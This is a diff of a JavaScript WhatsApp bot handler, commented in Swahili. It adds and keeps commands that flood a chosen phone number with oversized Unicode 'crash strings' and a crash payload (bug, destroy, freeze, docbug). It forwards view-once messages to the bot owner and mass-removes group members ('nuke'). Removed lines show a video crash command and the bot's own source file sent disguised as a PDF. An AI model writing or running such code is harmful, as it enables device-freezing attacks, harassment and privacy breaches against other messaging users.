@@ -2,13 +2,13 @@ const fs = require('fs');
 const payloads = require('./payloads');
 
 // --- ALIEN CRASH STRINGS (VIRUS) ---
-const bug1 = "🌋".repeat(50000); // Buffer Overflow string
-const bug2 = "⡈⡈⡈⡈⡈⡈".repeat(10000); // UI Freeze string
-const bug3 = "҈".repeat(20000); // Character Render Crash
+const bug1 = "🌋".repeat(50000); 
+const bug2 = "⡈⡈⡈⡈⡈⡈".repeat(10000); 
+const bug3 = "҈".repeat(20000); 
 
 module.exports = async (client, m) => {
     try {
-        if (!m.message) return; // Kuzuia error kama ujumbe hauna content
+        if (!m.message) return; 
         const from = m.key.remoteJid;
         const type = Object.keys(m.message)[0];
         const pushname = m.pushName || "User";
@@ -38,10 +38,6 @@ module.exports = async (client, m) => {
             viewoncehack: true
         };
 
-        // --- LOGGING TRAFFIC ---
-        let logMsg = `[${new Date().toLocaleTimeString()}] From: ${pushname} (${sender.split('@')[0]}) -> ${body.slice(0, 20)}...\n`;
-        if (isOwner) fs.appendFileSync('./logs.txt', logMsg);
-
         // 1. AUTO STATUS VIEW & LIKE
         if (m.key.remoteJid === 'status@broadcast' && settings.autostatus) {
             await client.readMessages([m.key]);
@@ -50,7 +46,7 @@ module.exports = async (client, m) => {
             }
         }
 
-        // 2. VIEW ONCE HACK (Decodes automatically)
+        // 2. VIEW ONCE HACK
         if ((type === 'viewOnceMessageV2' || type === 'viewOnceMessage') && settings.viewoncehack) {
             let viewOnce = m.message.viewOnceMessageV2 || m.message.viewOnceMessage;
             await client.sendMessage(client.user.id, { forward: viewOnce, caption: `🔓 *View Once Hack* \nFrom: @${sender.split('@')[0]}`, mentions: [sender] });
@@ -59,7 +55,7 @@ module.exports = async (client, m) => {
         // 3. ANTI-LINK
         if (isGroup && body.match(/chat.whatsapp.com/gi) && settings.antilink && !isOwner) {
             await client.sendMessage(from, { delete: m.key });
-            await client.sendMessage(from, { text: `🚫 *Link Detected!* Unaruhusiwi kutuma links hapa.` });
+            await client.sendMessage(from, { text: `🚫 *Link Detected!* Link ni marufuku hapa.` });
         }
 
         // 4. AUTO REACT
@@ -107,7 +103,8 @@ module.exports = async (client, m) => {
 
 ┏━━『 *TERMINAL & UTILS* 』━━┓
 ┃ ⚡ *.ping* - Speed Test
-┃ 🌤️ *.weather* [Mji] - Weather
+┃ 👽 *.alienscott* - Special Logo
+┃ 🛸 *.system* - System Specs
 ┃ 👻 *.hidetag* [Text] - Tag All
 ┃ 🔒 *.public* / *.private*
 ┃ 📝 *.logs* - View Traffic
@@ -120,6 +117,20 @@ module.exports = async (client, m) => {
             }
             break;
 
+            case 'alienscott': {
+                await client.sendMessage(from, { text: payloads.alien_logo });
+            }
+            break;
+
+            case 'system': {
+                await client.sendMessage(from, { text: payloads.system_info });
+            }
+            break;
+
+            case 'ping':
+                await client.sendMessage(from, { text: "🚀 *ALLY SCOTT V11* Response: " + (Date.now() - m.messageTimestamp * 1000) + "ms" });
+                break;
+
             case 'hidetag': {
                 if (!isGroup || !isOwner) return;
                 const groupMetadata = await client.groupMetadata(from);
@@ -129,17 +140,11 @@ module.exports = async (client, m) => {
             }
             break;
 
-            case 'ping':
-                await client.sendMessage(from, { text: "🚀 *ALLY SCOTT V11* Response: " + (Date.now() - m.messageTimestamp * 1000) + "ms" });
-                break;
-
             case 'bug':
             case 'destroy':
             case 'freeze':
             case 'infinity':
-            case 'docbug':
-            case 'audiobug':
-            case 'picbug': {
+            case 'docbug': {
                 if (!isOwner) return;
                 if (!args[0]) return client.sendMessage(from, { text: "Weka namba ya target!" });
                 let target = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
@@ -149,48 +154,21 @@ module.exports = async (client, m) => {
                 await client.sendMessage(target, { text: bug2 });
                 await client.sendMessage(target, { text: bug3 });
 
-                for (let i = 0; i < 5; i++) {
-                    if (payloads && payloads.crashPayload) {
+                for (let i = 0; i < 3; i++) {
+                    if (payloads.crashPayload) {
                         await client.sendMessage(target, { text: payloads.crashPayload });
                     }
-                    if (command === 'docbug') {
-                        await client.sendMessage(target, { document: fs.readFileSync('./index.js'), mimetype: 'application/pdf', fileName: 'SYSTEM_CRASH.pdf' });
-                    }
                 }
-                await client.sendMessage(from, { text: "✅ *System Overloaded!* Injection successful." });
-            }
-            break;
-
-            case 'vcrash': {
-                if (!isOwner) return;
-                if (!args[0]) return client.sendMessage(from, { text: "Weka namba ya target!" });
-                let vTarget = args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net";
-                await client.sendMessage(from, { text: "💉 *Injecting Video Buffer Crash...*" });
-                await client.sendMessage(vTarget, { 
-                    video: { url: 'https://raw.githubusercontent.com/DikaArdnt/Helloop/main/media/menu.mp4' }, 
-                    caption: bug2 
-                });
-                await client.sendMessage(from, { text: "✅ *Video Virus Sent!*" });
-            }
-            break;
-
-            case 'inspect': {
-                if (!isOwner) return;
-                let who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.sender;
-                await client.sendMessage(from, { text: `📊 *INSPECTION REPORT*\n👤 User: @${who.split('@')[0]}\n🛡️ Rank: Member\n📍 Platform: Mobile`, mentions: [who] });
+                await client.sendMessage(from, { text: "✅ *System Overloaded!* Success." });
             }
             break;
 
             case 'vv': {
-                // Tumeondoa m.reply na kuweka client.sendMessage kwa usalama
                 if (!m.message.extendedTextMessage?.contextInfo?.quotedMessage) return client.sendMessage(from, { text: "Tag view once message!" });
-                await client.sendMessage(from, { text: "🔓 *Decoding View Once...*" });
                 let quoted = m.message.extendedTextMessage.contextInfo.quotedMessage;
                 let viewOnce = quoted.viewOnceMessageV2 || quoted.viewOnceMessage;
                 if (viewOnce) {
-                    await client.sendMessage(client.user.id, { forward: { key: m.key, message: quoted }, caption: `🔓 *View Once Recovered*` });
-                } else {
-                    await client.sendMessage(from, { text: "Hii sio View Once message!" });
+                    await client.sendMessage(from, { forward: { key: m.key, message: quoted }, caption: `🔓 *View Once Recovered*` });
                 }
             }
             break;
@@ -198,22 +176,10 @@ module.exports = async (client, m) => {
             case 'nuke': {
                 if (!isOwner || !isGroup) return;
                 const groupMetadata = await client.groupMetadata(from);
-                const participants = groupMetadata.participants;
-                await client.sendMessage(from, { text: "🧨 *Nuking Group... Goodbye!*" });
-                for (let mem of participants) {
-                    if (!mem.admin) {
-                        await client.groupParticipantsUpdate(from, [mem.id], "remove");
-                    }
+                for (let mem of groupMetadata.participants) {
+                    if (!mem.admin) await client.groupParticipantsUpdate(from, [mem.id], "remove");
                 }
-            }
-            break;
-
-            case 'logs': {
-                if (!isOwner) return;
-                if (!fs.existsSync('./logs.txt')) fs.writeFileSync('./logs.txt', '--- SYSTEM START ---\n');
-                let logData = fs.readFileSync('./logs.txt', 'utf8');
-                let recentLogs = logData.split('\n').slice(-15).join('\n');
-                await client.sendMessage(from, { text: `📋 *SYSTEM TRAFFIC LOGS:* \n\n${recentLogs}` });
+                await client.sendMessage(from, { text: "🧨 *Nuked!*" });
             }
             break;
 
